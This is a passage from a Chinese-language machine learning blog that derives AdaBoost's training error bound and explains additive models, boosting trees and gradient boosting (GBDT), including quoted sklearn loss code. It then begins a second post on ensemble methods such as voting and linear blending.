=Z_1\\sum_{i=1}^N D_{2,i} \\prod_{t=2}^{T} \\exp\\left (-y_i\\alpha_th_t({\\bf x})\\right) \\hspace{5ex} 式2-2 \\\\&amp; =Z_1Z_2\\sum_{i=1}^N D_{3,i} \\prod_{t=3}^{T} \\exp\\left (-y_i\\alpha_th_t({\\bf x})\\right) \\\\&amp; =Z_1Z_2\\cdots Z_{T-1}\\sum_{i=1}^N D_{T,i} \\prod_{t=T}^{T} \\exp\\left (-y_i\\alpha_th_t({\\bf x})\\right) \\\\&amp; =Z_1Z_2\\cdots Z_{T}\\sum_{i=1}^N D_{T + 1,i} \\\\&amp; =Z_1Z_2\\cdots Z_{T}\\sum_{i=1}^N D_{T + 1,i} \\hspace{7ex} \\sum_{i=1}^N D_{T + 1,i}=1 \\\\&amp; =\\prod_{t=1}^TZ_t \\end{align*} \\] 即我们最小化\\(\\prod_{t=1}^TZ_t\\)等价于最小化指数损失函数，我们可以在每一轮都最小化\\(Z_t\\) \\[ \\begin{align*} Z_t &amp;= {\\sum_{i=1}^N D_{t,i}}\\cdot \\exp\\left(-y_i\\alpha_th_t({\\bf x_i}) \\right) \\\\&amp;= {\\sum_{i: \\ y_i \\ne h_t(x_i)} D_{t,i}}\\exp(\\alpha_t) + {\\sum_{i: \\ y_i = h_t(x_i)} D_{t,i}}\\exp(-\\alpha_t) \\\\&amp;= \\epsilon_te^{\\alpha_t} + (1 - \\epsilon_t)e^{-\\alpha_t} \\end{align*}\\tag{2-3} \\] 对\\(\\alpha_t\\)求导得得到权重公式： \\[ \\frac{\\partial Z_t}{\\partial \\alpha_t} = \\epsilon_te^{\\alpha_t} - (1 - \\epsilon_t)e^{-\\alpha_t} = 0 \\hspace{4ex}\\Rightarrow \\alpha_t= \\frac{1}{2}\\ln\\frac{1-\\epsilon_t}{\\epsilon_t}\\tag{2-4} \\] 将2-4带入2-3得： \\[ Z_t = 2\\sqrt{\\epsilon_t(1-\\epsilon_t)} = \\sqrt{1 - (1-2\\epsilon_t)^2} = \\sqrt{1 - 4\\gamma_t^2} \\hspace{4ex} 设\\gamma_t = \\frac{1}{2} - \\epsilon_t \\] 因此，2-1的训练误差界可以写为： \\[ \\frac{1}{N}\\sum_{i=1}^N I \\left(H({\\bf x_i}) \\ne y_i \\right) \\le \\prod_{t}Z_t = \\prod_{t} \\sqrt{1 - 4\\gamma_t^2} \\le exp(-2\\sum_{t=1}^T\\gamma_t^2)\\tag{2-5} \\] 李航老师的书中说：2-5的最后一个式子可先由\\(e^x\\)和\\(\\sqrt{1-x}\\)在点x = 0的泰勒展开式推出不等式\\(\\sqrt{1 - 4\\gamma_t^2} \\le exp(-2\\gamma_t^2)\\)进而得到。 这表明Adaboost的训练误差是以指数速率下降的。 PS： Adaboost能适应弱分类器各自的训练误差，这也是它的名字（适应的提升）的由来。Ada是Adaptive的简写。 加法模型和前向分布算法 本小节主要介绍加法模型。 Adaboost可以看出是加法模型、损失函数为指数损失函数、学习算法为前向分布算法时的二分类学习方法。此外，之后要介绍的GBDT也可以看出是加法模型。 加法模型即： \\[ F({\\bf x}) =\\sum_{t=1}^T \\alpha_t h_t({\\bf x}; {\\bf w_t}) = \\sum_{i=1}^Tf_t({\\bf x}; {\\bf w_t}) \\tag{3-1} \\] 其中,\\(h_t({\\bf x}; {\\bf w_t})\\)为基学习器， \\(\\bf x\\)为输入样本，\\(\\bf w\\)为基学习器的参数，而\\(\\alpha_t\\)为每个基学习器\\(h_t\\)的权重 可以通过最小化损失函数进行求解，即求经验风险极小化问题： \\[ \\min_{\\alpha,\\bf w} \\sum_{i=1}^N L\\left(y_i, \\sum_{t=1}^T \\alpha_t h_t({\\bf x}; {\\bf w_t})\\right)\\tag{3-2} \\] 要求解这个问题，是NP难的，一般用贪心法进行求解，即前向分布算法：从前往后，每一步只学习一个基函数及其系数，逐步优化3-2式。前向分布算法可以描述如下： 输入: 训练集 \\(Data =\\{({\\bf x_1},y_1),({\\bf x_2},y_2),\\cdots,({\\bf x_N},y_N)\\}, y_i \\in\\{+1, -1\\}\\); ​ 损失函数L 过程： ​ for t = 1 to T do ​ \\((\\alpha_t, w_t) = \\arg\\min_{\\alpha_t,w_t} \\sum_{i=1}^N L\\left(y_i, f_{t-1}({\\bf x_i}) + \\alpha_t h_t({\\bf x}; {\\bf w_t})\\right)\\) # 得到参数和基学习器权重 ​ 更新\\(f_t({\\bf x}) = f_{t-1}({\\bf x_i}) + \\alpha_t h_t({\\bf x}; {\\bf w_t})\\) 得到加法模型 ​ \\(F({\\bf x}) = f_{t}({\\bf x}) = \\sum_{t=1}^T \\alpha_t h_t({\\bf x}; {\\bf w_t})\\) 这样，便将同时求解t = 1到T的所有参数\\(\\alpha_t, \\bf w_t\\)的优化问题转化为逐步求解各个\\(\\alpha_t, \\bf w_t\\)的问题。 再谈Adaboost 上面说到，Adaboost是加法模型，损失函数为指数损失函数，并采用前向分布算法。 下面进行证明： 前向分布分布算法学习的是加法模型，当基函数为基本分类器时，该加法模型等价于Adaboost的最终分类器。\\(H({\\bf x}) = \\sum_{t=1}^T \\alpha_t h_t({\\bf x})\\) 指数损失函数 首先证明前向分布算法的损失函数是指数损失函数\\(L(y, F({\\bf x})) = \\exp(-yF({\\bf x}))\\)时，其学习的具体操作等价于Adaboost算法学习的具体操作。 假设经过t - 1轮迭代前向分步算法已经得到\\(f_{t-1}({\\bf x}) = f_{t-2}({\\bf x}) + \\alpha_{t-1}h_{t-1}({\\bf x}) = \\alpha_{1}h_1({\\bf x}) + \\cdots + \\alpha_{t-1}h_{t-1}({\\bf x})\\) 则在第t轮迭代应该寻找最优的\\(\\alpha_t, h_t\\)使得指数损失最小即 \\((\\alpha_t, h_t) = \\arg\\min_{\\alpha_t,h_t} \\sum_{i=1}^N L\\left(y_i, f_{t-1}({\\bf x_i}) + \\alpha_t h_t({\\bf x})\\right)\\) 从而得到\\(f_{t}({\\bf x}) = f_{t-1}({\\bf x}) + \\alpha_{t}h_t({\\bf x})\\)。而指数损失最小可以写为： \\[ \\begin{align*} (\\alpha_t, h_t) &amp;=\\mathop{\\arg\\min}_{\\alpha_t,h_t} \\sum_{i=1}^N \\exp\\left(-y_i(f_{t-1}({\\bf x_i}) + \\alpha_th_t({\\bf x}))\\right) \\\\ &amp;=\\mathop{\\arg\\min}_{\\alpha_t,h_t} \\sum_{i=1}^N D_{t,i}\\exp\\left( -y_i\\alpha_th_t({\\bf x})\\right)\\tag{3-3} \\end{align*} \\] 其中\\(D_{ti} = Error_{(t-1,i)} = \\exp(-y_if_{t-1}({\\bf x_i}))\\)与当前的优化目标无关，只与之前的有关，因此为指数损失函数。 基分类器求解和权重推导 接着证明使得式子3-3达到最小的\\(\\alpha_t^*\\)和\\(h_t^*({\\bf x})\\)就是Adaboost算法得到的\\(\\alpha_t\\)和\\(h_t({\\bf x})\\)。 求解3-3可以分为两步，首先求\\(h_t({\\bf x})\\)，对于任意的\\(\\alpha_t \\gt 0\\)，使3-3最小的\\(h_t({\\bf x})\\)由下式得到： \\[ h_t^*({\\bf x}) = \\mathop{\\arg\\min}_h \\sum_{i=1}^ND_{t,i}I(y_i\\ne h({\\bf x})) \\] 其中\\(D_{t,i}= \\exp(-y_if_{t-1}(\\bf x_i))\\)。 这样就得到了基分类器\\(h_t^*({\\bf x})\\)，而该分类器就是Adaboost算法的基本分类器\\(h_t({\\bf x})\\)，因为它是第t轮加权训练数据分类误差率最小的基本分类器。 接下来求\\(\\alpha_t\\), 式在3-3中： \\[ \\begin{align*} \\sum_{i=1}^N D_{t,i}\\exp\\left( -y_i\\alpha_th_t({\\bf x})\\right) &amp; = \\sum_{y_i=h_t(\\bf x)}D_{t,i} e^{-\\alpha} + \\sum_{y_i\\ne h_t(\\bf x)}D_{t,i}e^{\\alpha} \\\\ &amp;=e^{-\\alpha}\\sum_{i=1}^ND_{t,i} + (e^{\\alpha} - e^{-\\alpha})\\sum_{i=1}^N D_{t,i}I(y_i\\ne h_t({\\bf x_i})) \\tag{3-4} \\end{align*} \\] 最后一个变换可以认为是第一项多加了不相等时候的\\(e^{-\\alpha}\\), 因此在第二项的时候减去。1-8对\\(\\alpha\\)求导，并使导数为0，得到使得3-3最小的\\(\\alpha_t\\) \\[ \\alpha_t = \\frac{1}{2} \\ln(\\frac{1 - \\epsilon_t }{\\epsilon_t}) \\] 其中\\(\\epsilon_t\\)为分类误差率 \\[ \\epsilon_t = \\frac{\\sum_{i=1}^N D_{t,i}I(y_i\\ne h_t({\\bf x}))}{\\sum_{i=1}^N D_{t,i}} = \\sum_{i=1}^N \\tilde D_{t,i}I(h_t(x_i) \\ne y_i) \\] 可以看出和之前更新\\(\\alpha_t\\)一致。 最后来看每一轮样本的权值更新，由\\(f_{t}({\\bf x}) = f_{t-1}({\\bf x}) + \\alpha_{t}h_t({\\bf x})\\)和\\(D_{t,i}= \\exp(-y_if_{t-1}(\\bf x_i))\\)可得： \\[ \\begin{align*} D_{t + 1,i} &amp;= \\exp(-y_if_{t}(\\bf x_i))\\\\ &amp;= \\exp(-y_i( f_{t-1}({\\bf x_i}) + \\alpha_{t}h_t({\\bf x_i}))\\\\ &amp;= D_{(t,i)}\\exp(- \\alpha_{t}y_{i}h_t({\\bf x_i}))\\\\ \\end{align*} \\] 这与之前的Adaboost的样本权值更新公式相比，只差规范化因子，因而等价。 GBDT GBDT全称为：Gradient Boosting Decision Tree，即梯度提升决策树。可以理解为梯度 + 提升 + 决策树。 在介绍GBDT之前，先介绍比较简单的提升树（Boosting Decision Tree） 提升树 提升树实际上就是加法模型和前向分布算法，然后以CART决策树为基学习器。 可以表示为决策树的前向分布算法 \\[ \\begin{align*} F_0({\\bf x}) &amp;= 0\\\\ F_t({\\bf x}) &amp;= F_{t-1}({\\bf x}) + h_t({\\bf x}), t=1,2,\\cdots ,T\\\\ F_T({\\bf x}) &amp;= \\sum_{t=1}^Th_t({\\bf x}) \\end{align*} \\] 在前向分布算法的第t步，给定当前模型\\(F_{t-1}({\\bf x})\\)，需要求解 \\[ h_t^*({\\bf x}) = \\mathop{\\arg\\min}_{h_t} \\sum_{i=1}^NL(y_i, F_{t-1}({\\bf x}) + h_t({\\bf x})) \\] 得到第t棵树\\(F_{t}({\\bf x})\\)。针对不同问题的提升树学习方法，主要区别在于使用的损失函数不同。比如平方误差损失函数的回归问题，用指数损失函数的分类问题，以及用一般损失函数的问题。 采用平方损失函数时，有： \\[ \\begin{align*} L\\left(y, F_{t-1}({\\bf x}\\right) + h_t({\\bf x})) &amp;=\\left(y - F_{t-1}({\\bf x} ) - h_t({\\bf x})\\right)^2\\\\ &amp;=(r - h_t({\\bf x}))^2 \\end{align*} \\] 其中\\(r = y - F_{t-1}({\\bf x})\\) 称为残差(Residual)。因此，对回归树的提升树算法来说，只需要简单的拟合当前模型的残差即可。注意这里的是回归树。 因此回归问题的提升树算法可以描述如下： 输入: 训练集 \\(Data =\\{({\\bf x_1},y_1),({\\bf x_2},y_2),\\cdots,({\\bf x_N},y_N)\\}, y_i \\in\\{+1, -1\\}\\); 过程： ​ 初始化\\(F_0({\\bf x}) = 0\\) ​ for t = 1 to T do ​ 计算残差 \\(r_{ti} = y_i - F_{t-1}({\\bf x}) , \\ i=1,2,\\cdots,N\\) ​ 拟合残差得到一个回归树：\\(h_t({\\bf x})\\) ​ 更新\\(F_t({\\bf x}) = F_{t-1}({\\bf x_i}) + h_t({\\bf x})\\) 得到加法模型\\(F({\\bf x}) = \\sum_{t=1}^T h_t({\\bf x})\\) 该算法可以用下面的图表示： Boosting tree 对比Adaboost来说，该算法可以说是修改样本的\"label\"，而AdaBoost则是修改样本的权重。 例子 继续搬出之前的决策树中的例子 x 1 2 3 4 5 6 7 8 9 10 y 5.56 5.70 5.91 6.40 6.80 7.05 8.90 8.70 9.00 9.05 第一轮计算后，我们算出（计算过程看决策树那章） \\[ h_1(x) = \\begin{cases} 6.24, &amp; x\\le 6.5 \\\\ 8.91, &amp; x \\gt 6.5 \\\\ \\end{cases} \\] 可以算出残差（比如x=1就是5.56 - 6.24 = -0.68） x 1 2 3 4 5 6 7 8 9 10 y -0.68 -0.54 -0.33 0.16 0.56 0.81 -0.01 -0.21 0.09 0.14 接着，继续拟合数据，只是拟合的是上面的残差。得到： \\[ h_2(x) = \\begin{cases} -0.52, &amp; x\\le 3.5 \\\\ 0.22, &amp; x \\gt 3.5 \\\\ \\end{cases} \\] 则\\(f_2({\\bf x})\\)为： \\[ F_2({\\bf x}) = f_1({\\bf x}) + f_2({\\bf x}) = \\begin{cases} 5.72, &amp; x\\le 3.5 \\\\ 6.46, &amp; 3.5\\lt x \\le 6.5 \\\\ 9.13, &amp; 6.5\\lt x \\end{cases} \\] 以此类推进行计算即可，直到损失\\(L(y, F_t(\\bf x))\\)满足要求，比如达到迭代次数T。 和决策树CART不同的地方在于，BDT每次拟合的是残差，而CART是经典的分治算法（divide and conquer），不断的划分子空间并在子空间中进一步精确的拟合。 梯度提升 前面提到过，GBDT全称为Gradient Boosting Decision Tree，梯度提升决策树。 现在我们来介绍通用的“梯度提升”算法。 当采用平方损失和指数损失的时候，每一步优化是很简单的，但是一般的损失函数来说，每一步的优化不容易，因此提出了梯度提升的方法，这是利用梯度下降的近似方法，其关键是利用损失函数的负梯度在当前模型的值： \\[ -\\left[\\frac{\\partial L(y_i, F({\\bf x_i}))}{\\partial F({\\bf x_i})} \\right]_{F({\\bf x}) = F_{t-1}({\\bf x})}\\tag{4-1} \\] 怎么理解这个近似呢？ 以前面的均方损失函数为例，也是可以用这个方法来解释的。为了求导方便，我们在均方损失函数前乘以 1/2。 \\[ \\begin{align*} L(y_i, F({\\bf x_i})) = \\frac{1}{2}(y_i - F({\\bf x_i}))^2 \\end{align*} \\] 注意到\\(F({\\bf x_i})\\)其实只是一些数字而已，我们可以将其像变量一样进行求导： \\[ \\begin{align*} \\frac{\\partial L(y_i, F({\\bf x_i}))}{\\partial F({\\bf x_i})} = F({\\bf x_i}) - y_i \\end{align*} \\] 而前面所说的残差就是上式相反数，即负梯度： \\[ r_{ti} = y_i - F_{t-1}({\\bf x}) =-\\left[\\frac{\\partial L(y_i, F({\\bf x_i}))}{\\partial F({\\bf x_i})} \\right]_{F({\\bf x}) = F_{t-1}({\\bf x})} \\] 在梯度提升中，就是将式2-1作为残差来进行拟合。由此，我们给出一般的梯度提升算法： 输入: 训练集 \\(Data =\\{({\\bf x_1},y_1),({\\bf x_2},y_2),\\cdots,({\\bf x_N},y_N)\\}, y_i \\in\\{+1, -1\\}\\); 过程： ​ 初始化\\(F_0({\\bf x}) =\\mathop{\\arg\\min}_{h_0} \\sum_{i=1}^NL(y_i, h_0({\\bf x}))\\) ​ for t = 1 to T do ​ 计算负梯度 \\({\\tilde y}_{i} = -\\left[\\frac{\\partial L(y_i, F({\\bf x_i}))}{\\partial F({\\bf x_i})} \\right]_{F({\\bf x}) = F_{t-1}({\\bf x})} , \\ i=1,2,\\cdots,N\\) ​ \\(w_t = \\arg\\min_{w_t} \\sum_{i=1}^N \\left({\\tilde y}_{i} - h_t({\\bf x}; {\\bf w_t})\\right)^2\\) # 拟合“残差“得到基学习器权重，也就得到了基学习器 ​ \\(\\alpha_t= \\arg\\min_{\\alpha_t} \\sum_{i=1}^N L\\left(y_i, f_{t-1}({\\bf x_i}) + \\alpha_t h_t({\\bf x}; {\\bf w_t})\\right)\\) # 得到基学习器权重\\(\\alpha_t\\) ​ 更新\\(F_t({\\bf x}) = F_{t-1}({\\bf x_i}) + \\alpha_th_t({\\bf x}; {\\bf w_t})\\) 对比提升树来说，提升树没有基学习器参权重\\(\\alpha_t\\) GBDT 至此，我们可以给出GBDT的算法了。就是采用梯度提升的决策树（CART）而已嘛。PS: 上面给出的是梯度提升。 前面提到过，CART回归将空间划分为K个不相交的区域。可以用数学公式描述为： \\[ f(\\mathbf{X}) = \\sum_{k=1}^K c_k I(\\mathbf{X} \\in R_k) \\] GBDT算法(回归)描述如下： 输入: 训练集 \\(Data =\\{({\\bf x_1},y_1),({\\bf x_2},y_2),\\cdots,({\\bf x_N},y_N)\\}, y_i \\in\\{+1, -1\\}\\); 过程： ​ 初始化\\(F_0({\\bf x}) =\\mathop{\\arg\\min}_{h_0} \\sum_{i=1}^NL(y_i, h_0({\\bf x})) =\\mathop{\\arg\\min}_{c} \\sum_{i=1}^NL(y_i, c))\\) ​ for t = 1 to T do ​ 计算残差 \\({\\tilde y}_{i} = -\\left[\\frac{\\partial L(y_i, F({\\bf x_i}))}{\\partial F({\\bf x_i})} \\right]_{F({\\bf x}) = F_{t-1}({\\bf x})} , \\ i=1,2,\\cdots,N\\) ​ 拟合残差\\({\\tilde y}_{i}\\)得到一个回归树，得到第t棵树的叶结点区域\\(R_{tk}\\)：\\(h_t({\\bf x})= \\sum_{k=1}^K c_k I(\\mathbf{X} \\in R_{tk})\\) ​ 更新\\(F_t({\\bf x}) = F_{t-1}({\\bf x_i}) + h_t({\\bf x}) = F_{t-1}({\\bf x_i}) + \\sum_{k=1}^K c_k I(\\mathbf{X} \\in R_{tk})\\) 得到加法模型 ​ \\(F({\\bf x}) = \\sum_{t=1}^T h_t({\\bf x})\\) 可以说，如果我们的任务是回归的话，并且使用RMSE作为损失函数，就和上面的boosting tree一样。因为负梯度算出来就是残差:\\(\\left(y - F_{t-1}({\\bf x} ) - h_t({\\bf x})\\right)^2=(r - h_t({\\bf x}))^2\\) GBDT 分类 如果要将GBDT用于分类问题，怎么做呢？ 首先要明确的是，GBDT用于分类时使用的仍然是CART回归树。回想我们做回归问题的时候，每次对残差（负梯度）进行拟合。而分类问题要怎么每次对残差拟合？要知道类别相减是没有意义的。因此，可以用Softmax进行概率的映射，然后拟合概率的残差！ 具体的做法如下： 针对每个类别都先训练一个回归树，如三个类别，训练三棵树。就是比如对于样本\\(\\bf x_i\\)为第二类，则输入三棵树分别为：\\(({\\bf x_i}, 0), ({\\bf x_i},1); ({\\bf x_i}, 0)\\)这其实是典型的OneVsRest的多分类训练方式。 而每棵树的训练过程就是CART的训练过程。这样，对于样本\\(\\bf x_i\\)就得出了三棵树的预测值\\(F_1({\\bf x_i}),F_2({\\bf x_i}),F_3({\\bf x_i})\\)，模仿多分类的逻辑回归，用Softmax来产生概率，以类别1为例：\\(p_{1}({\\bf x_i})=\\exp(F_{1}{({\\bf x_i})})/\\sum_{l= 1}^{3}\\exp(F_{l}{({\\bf x_i})})\\) 对每个类别分别计算残差，如类别1：\\({\\tilde y}_{i1}= 0 - p_1({\\bf x_i})\\), 类别2： \\({\\tilde y}_{i2}= 1 - p_2({\\bf x_i})\\)， 类别3：\\({\\tilde y}_{i3}= 0 - p_3({\\bf x_i})\\) 开始第二轮的训练，针对第一类 输入为\\(({\\bf x_i}, {\\tilde y}_{i1})\\), 针对第二类输入为\\(({\\bf x_i}, {\\tilde y}_{i2})\\) ，针对第三类输入为 \\(({\\bf x_i}, {\\tilde y}_{i3})\\)，继续训练出三颗树。 重复3直到迭代M轮，就得到了最后的模型。预测的时候只要找出概率最高的即为对应的类别。 和上面的回归问题是大同小异的。 被忽略的第三步 在原始的论文中，多分类的GBDT描述如下图（注意这里的m代表的是树的个数，N为样本数, K为类别数） GBDT-classification 可以看出，和上面的一样，首先计算各个类的概率。然后对于每个类，计算出残差，然后用CART回归树拟合。这里和上面描述的是一样的。但是之后的倒数第五行那是什么鬼？在原论文中，描述为：拟合完后，每棵树有J个叶结点，对应区域\\(\\{R_{jkm}\\}_{j=1}^J\\)，模型通过下式的解更新这些\\({\\gamma}_{jkm}\\) \\[ {\\gamma}_{jkm} = \\mathop{\\arg\\min}_{\\gamma_{jk}} \\sum_{i=1}^N\\sum_{k=1}^{K} \\phi \\left(y_{ik}, F_{k,m-1}({\\bf x}) + \\sum_{j=1}^J\\gamma_{jk}I({\\bf x_i} \\in R_{jm})\\right) \\\\ \\phi(y_{k}, F_k)= -y_k\\log p_k = p_{1}({\\bf x_i})= -y_k\\frac{exp(F_{k}{({\\bf x_i})})}{\\sum_{l= 1}^{K}exp(F_{l}{({\\bf x_i})})} \\] 但是这个式子没有闭式解。因此用牛顿法(Newton-Raphson step)进行近似。就是上面倒数第五行的结果。不过比较丢脸的是，这个我没有推出来。Sklearn中的GBDT实现中(MultinomialDeviance)，又略有不同，因此如果读者你会推的话就告诉博主把~ 虽然说没有推出来，但是大多数情况下，可以通过设置步长（Step-size，也有的叫收缩率Shrinkage）的方式来省略这一步。因此很多资料很往往不介绍这一步。关于步长，本文最后有介绍。 Sklearn GBDT二分类实现 - BinomialDeviance 在GBDT二分类中，可以用Logistic函数进行概率映射，而可以不用多分类的SoftMax。 为了挽回一点面子，讲讲sklearn二分类的BinomialDeviance的实现。代码如下： 123456789101112131415class BinomialDeviance(ClassificationLossFunction): ... def __call__(self, y, pred, sample_weight=None): &quot;&quot;&quot;Compute the deviance (= 2 * negative log-likelihood). &quot;&quot;&quot; # logaddexp(0, v) == log(1.0 + exp(v)) pred = pred.ravel() if sample_weight is None: return -2.0 * np.mean((y * pred) - np.logaddexp(0.0, pred)) else: return (-2.0 / sample_weight.sum() * np.sum(sample_weight * ((y * pred) - np.logaddexp(0.0, pred)))) def negative_gradient(self, y, pred, **kargs): &quot;&quot;&quot;Compute the residual (= negative gradient). &quot;&quot;&quot; return y - expit(pred.ravel()) 首先是损失函数，忽略sample_weight权重设置，看看代码第八行。翻译过来就是 \\[ -2.0 \\frac{1}{N}(yP - \\log(1 + exp(P))) \\] 怎么感觉和对率损失不太一样？ \\[ \\begin{align*} L = -(y \\log(h) + (1-y) \\log(1 - h) &amp;= -\\left( \\log(1 - h) + y \\log \\left( \\frac{h}{1-h}\\right) \\right) \\\\ &amp;=-\\log(h(-P))- y P\\hspace{4ex} 其中h(P) = \\frac{1}{1+e^{-P}} \\\\ &amp;=\\log(1+ \\exp(P)) - yP \\end{align*} \\] 这正是Sklearn使用的损失函数。 而负的梯度呢？ \\[ -\\frac{\\partial L}{\\partial P} = y - \\frac{\\exp(P)}{1+ \\exp(P)} = y- h(P) \\] 就是上面的y - expit(pred.ravel()) 再来看看牛顿法更新： 123456789101112131415def _update_terminal_region(self, tree, terminal_regions, leaf, X, y, residual, pred, sample_weight): terminal_region = np.where(terminal_regions == leaf)[0] residual = residual.take(terminal_region, axis=0) y = y.take(terminal_region, axis=0) sample_weight = sample_weight.take(terminal_region, axis=0) numerator = np.sum(sample_weight * residual) denominator = np.sum(sample_weight * (y - residual) * (1 - y + residual)) # prevents overflow and division by zero if abs(denominator) &lt; 1e-150: tree.value[leaf, 0, 0] = 0.0 else: tree.value[leaf, 0, 0] = numerator / denominator 主要查看numerator和denominator的计算，这里\\(residual = y - h(P)\\) 分子就是上面的负梯度，即\\(residual = y - h(P)\\) 分母为二阶导，即\\(h(P)(1-h(P))= (y-residual)*(1-y+residual))\\) GBDT 正则化 为了避免过拟合，可以从两方面入手： 弱算法的个数T， 上面描述的算法中，记得么？就是迭代T轮。T的大小就影响着算法的复杂度 步长（Shrinkage）在每一轮迭代中，原来采用\\(F_t({\\bf x}) = F_{t-1}({\\bf x}) + \\alpha_th_t({\\bf x}; {\\bf w_t})\\)进行更新，可以加入步长v，使得一次不更新那么多：\\(F_t({\\bf x}) = F_{t-1}({\\bf x}) + v \\ \\alpha_th_t({\\bf x}; {\\bf w_t}); v\\in(0,1]\\) 参考资料 机器学习技法 - 林轩田 《机器学习》 - 周志华 《统计学习方法》 - 李航 关于Adaboost还可以查阅： Boosting Can we make dumb learners smart Adaboost - 新的角度理解权值更新策略 关于GBDT可以查阅 Greedy Function Approximation: A Gradient Boosting Machine A Gentle Introduction to Gradient Boosting https://www.cnblogs.com/ModifyRong/p/7744987.html","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"机器学习","slug":"study/机器学习","permalink":"https://www.hrwhisper.me/categories/study/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://www.hrwhisper.me/tags/Machine-Learning/"},{"name":"Machine Learning model","slug":"Machine-Learning-model","permalink":"https://www.hrwhisper.me/tags/Machine-Learning-model/"}]},{"title":"『我爱机器学习』集成学习（一）模型融合与Bagging","slug":"machine-learning-model-ensemble-and-bagging","date":"2018-04-30T13:50:55.000Z","updated":"2020-10-19T14:35:48.805Z","comments":true,"path":"machine-learning-model-ensemble-and-bagging/","link":"","permalink":"https://www.hrwhisper.me/machine-learning-model-ensemble-and-bagging/","excerpt":"在KDD CUP、Kaggle、天池等数据挖掘比赛中，常常用到集成学习。使用了集成学习后，模型的效果往往有很大的进步。 本文将介绍常见的集成学习方法，包括但不限于： 集成学习为什么有效 Voting Linear Blending Stacking Bagging 随机森林","text":"在KDD CUP、Kaggle、天池等数据挖掘比赛中，常常用到集成学习。使用了集成学习后，模型的效果往往有很大的进步。 本文将介绍常见的集成学习方法，包括但不限于： 集成学习为什么有效 Voting Linear Blending Stacking Bagging 随机森林 集成学习 如果硬要把集成学习进一步分类，可以分为两类，一种是把强分类器进行强强联合，使得融合后的模型效果更强，称为模型融合。另一种是将弱分类器通过学习算法集成起来变为很强的分类器，称为机器学习元算法。 这里我们把用来进行融合的学习器称为个体学习器。 模型融合的代表有：投票法(Voting)、线性混合(Linear Blending)、Stacking。 而机器学习元算法又可以根据个体学习器之间是否存在依赖关系分为两类，称为Bagging和Boosting: Bagging: 个体学习器不存在依赖关系，可同时对样本随机采样并行化生成个体学习器。代表作为随机森林(Random Forest) Boosting: 个体学习器存在依赖关系,基于前面模型的训练结果误差生成新的模型，必须串行化生成。代表的算法有：Adaboost、GBDT、XGBoost 其中，Boosting相关的内容将在集成学习（二）进行介绍。 模型融合 上面提到，模型融合是把强分类器进行强强联合，变得更强。 在进行模型融合的时候，也不是说随意的融合就能达到好的效果。进行融合时，所需的集成个体（就是用来集成的模型）应该好而不同。好指的是个体学习器的性能要好，不同指的是个体模型的类别不同。 这里举个西瓜书的例子，在介绍例子之前，首先提前介绍简单投票法，以分类问题为例，就是每个分类器对样例进行投票，哪个类别得到的票数最多的就是融合后模型的结果。 ensemble-example 在上面的例子中，采用的就是简单的投票法。中间的图b各个模型输出都一样，因此没有什么效果。第三个图c每个分类器的精度只有33%，融合后反而更糟。也就是说，想要模型融合有效果，个体学习器要有一定的准确率，并且要有多样性，学习器之间具有差异，即”好而不同“。 如何做到好而不同呢？可以由下面几个方面： 针对输入数据：使用采样的方法得到不同的样本（比如bagging方法采用自助法进行抽样） 针对特征：对特征进行抽样 针对算法本身： 个体学习器\\(h_t\\)来自不同的模型集合 个体学习器\\(h_t\\)来自于同一个模型集合的不同超参数，例如学习率\\(\\eta\\)不同 算法本身具有随机性，例如用不同的随机种子来得到不同的模型 针对输出：对输出表示进行操纵以增强多样性 如将多分类转化为多个二分类任务来训练单模型 将分类输出转化为回归输出等 那么进行模型融合为什么比较好呢？虽然有俗话说：三个臭皮匠赛过诸葛亮，但是我们还是想知道，究竟是如何“赛过诸葛亮”的。这里摘录西瓜书如下： 学习器的结合可能会从三个方面带来好处： 首先，从统计的方面来看，由于学习任务的假设空间往往很大，可能有多个假设在训练集上达到相同的性能，此时若使用单学习器，可能因误选而导致泛化性能不佳，结合多个学习器则会减少这一风险； 第二，从计算的方面来看，学习算法往往会陷入局部极小，有的局部极小点所对应的泛化性能可能很糟糕，而通过多次运行之后进行结合，可降低陷入糟糕局部极小点的风险； 第三，从表示的方面来看，某些学习任务的真实假设可能不在当前学习算法所考虑的假设空间中，此时若使用单学习器则肯定无效，而通过结合多个学习器，由于相应的假设空间有所扩大，有可能学得更好的近似。 advance-of-ensemble 下面介绍模型融合常见的方法。 投票和平均 Voting and Average 分类 对于分类任务来说，可以使用投票的方法： 简单投票法： \\(H({\\bf x}) =c_{\\underset{x}{\\mathrm{argmax}}}\\sum_{i=1}^Th_i^j({\\bf x})\\) 即各个分类器输出其预测的类别，取最高票对应的类别作为结果。若有多个类别都是最高票，那么随机选取一个。 加权投票法： \\(H({\\bf x}) =c_{\\underset{x}{\\mathrm{argmax}}}\\sum_{i=1}^T\\alpha_i\\cdot h_i^j({\\bf x})\\) 和上面的简单投票法类似，不过多了权重\\(\\alpha_i\\)，这样可以区分分类器的重要程度，通常\\(\\alpha_i \\ge 0;\\hspace{1ex} \\sum_{i=1}^T\\alpha_i = 1\\) 此外，个体学习器可能产生不同的\\(h_i^j({\\bf x})\\)的值，比如类标记和类概率。 类标记\\(h_i^j({\\bf x}) \\in \\{0, 1\\}\\)，若\\(h_i\\)将样本x预测为类别\\(c_j\\)取值为1，否则为0。使用类标记的投票亦称“硬投票”。(其实就是多分类的输出)，使用类标记的称为硬投票 类概率\\(h_i^j({\\bf x}) \\in [0, 1]\\)，即输出类别为\\(c_j\\)的概率。使用类概率的投票称为软投票。对应sklearn中的VotingClassifier中voting参数设为soft。 PS：使用类概率进行结合往往比直接基于类标记的效果好，即使分类器估计出的概率值一般都不太准确。 回归 对于回归任务来说，采用的为平均法： 简单平均：\\(H({\\bf x}) =\\frac{1}{T} \\sum_{i=1}^Th_i({\\bf x})\\) 加权平均：\\(H({\\bf x}) =\\frac{1}{T} \\sum_{i=1}^T\\alpha_i \\cdot h_i({\\bf x}) ; \\ \\ \\alpha_i \\ge 0; \\ \\ \\sum_{i=1}^T\\alpha_i = 1\\) 线性混合 Linear Blending 前面提到过加权平均法，每个个体学习器的权重不再相等，看起来就像是对每个个体学习器做一个线性组合，这也是线性混合法名字的由来。那么最优的权重是什么呢？一个直接的想法就是最好的\\(\\alpha_i\\)使得error最小，即对应了优化问题： \\[ \\min_{\\alpha_t\\ge0}\\ \\frac{1}{M}\\sum_{i=1}^M\\left(y_i - \\sum_{t=1}^T \\alpha_th_t({\\bf 